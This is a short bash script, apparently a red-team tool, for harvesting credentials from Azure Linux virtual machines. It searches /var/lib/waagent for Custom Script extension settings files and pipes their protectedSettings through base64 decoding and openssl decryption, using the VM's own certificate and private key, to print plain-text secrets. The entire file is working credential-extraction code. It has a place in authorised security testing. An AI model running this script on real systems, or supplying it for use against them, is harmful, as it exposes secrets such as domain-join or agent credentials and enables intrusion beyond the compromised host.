#!/bin/bash
# This script is used to support Red Team to perform a scan on Azure Virtual machine to harvest credential.
# Custom Script extension is often used on Linux VM for AD Join or security agent installation that may have secrets.
# Using this script you are able to decode encoded CommandToExcute object to extract plain-text secret.
# This script can be used to decode most Azure VM extensions except VM Access Extension.
# Reference: https://azsec.azurewebsites.net/2021/11/09/harvest-credential-from-custom-script-extension-on-azure-vm/
agent_path='/var/lib/waagent'

f=$(find $agent_path -type d -name "*.CustomScript*")
if [ -z "$f" ];then
  echo "[!] Can't find target agent directory"
  exit 1
else
  echo "[-] Find the target dir: $f"
  cd "$f" || exit
  for setting_files in $(find "$f" -type f -name "*.settings"); do
    for setting_file in $setting_files; do
      if [ -z "$setting_file" ]; then
        echo "[!] Can't find setting file"
        exit 1
      else
        echo "[-] Find a setting file: $setting_file"
        cert_thumbprint=$(jq -r '.runtimeSettings[].handlerSettings.protectedSettingsCertThumbprint' "$setting_file")
        echo "[-] Start decoding"
        jq -r '.runtimeSettings[].handlerSettings.protectedSettings' "$setting_file" | base64 --decode | openssl smime -inform DER -decrypt -recip ../"${cert_thumbprint}".crt -inkey ../"${cert_thumbprint}".prv | jq .
      fi
    done
  done
fi